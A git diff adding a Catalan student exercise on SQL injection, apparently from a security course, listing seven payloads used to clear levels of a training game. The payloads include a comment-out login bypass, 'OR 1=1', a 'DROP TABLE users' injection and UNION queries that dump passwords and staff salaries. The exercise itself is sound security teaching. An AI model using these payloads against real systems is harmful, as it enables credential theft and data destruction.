@@ -78,3 +78,17 @@ Impedeix la detecció temprana d'activitats sospitoses, permetent als atacants o
 ### Exemple:
  Una gran aerolínia  va tindre una bretxa de seguretat amb pèrdua de dades personals (passaports, targetes de crèdit) de milions de passatgers durant més de 10 anys, degut a un proveïdor de serveis d'emmagatzematge al núvol.
 
+
+# Exercici 2
+Obre el següent enllaç (sql inseckten) i realitza un mínim de 7 nivells fent servir tècniques d’injecció SQL. 
+
+## Copia cada una de les sentències SQL resultant que has realitzat a cada nivell i comenta que has aconseguit.
+- jane'; –  (Comentem el codi que valida, comentant codi.)
+- ' ; DROP TABLE users; –(Eliminem la taula users.)
+- ' OR 1=1; – () (entrem amb l’usuari sense posar cap contraseña, comentant codi i afegint una condició.)
+- ' OR 1=1 ORDER BY user_id LIMIT 1 – (entrem amb l’usuari sense posar cap contraseña com al anterior nivell. Pero tenint en compte la restricció que ens han possat fent limi 1.)
+- ' UNION select username, password from users; – (Fem una querie per saber les dades i obtenim tots els users i les seves contraseñas.)
+- ' UNION SELECT s.salary AS staff_salary FROM staff s WHERE s.firstname = 'Greta Maria' – (Obtenim el salary de Greta Maria utilitzant una querie)
+- ' UNION SELECT name, email, salary, employed_since FROM staff – (Obtenim totes les dades de la taula staff, fent una uqeire.)
+- 
+## Enumera i raona diferents formes que pot evitar un atac per SQL injection en projectes fets amb Razor Pages i Entity Framework. 
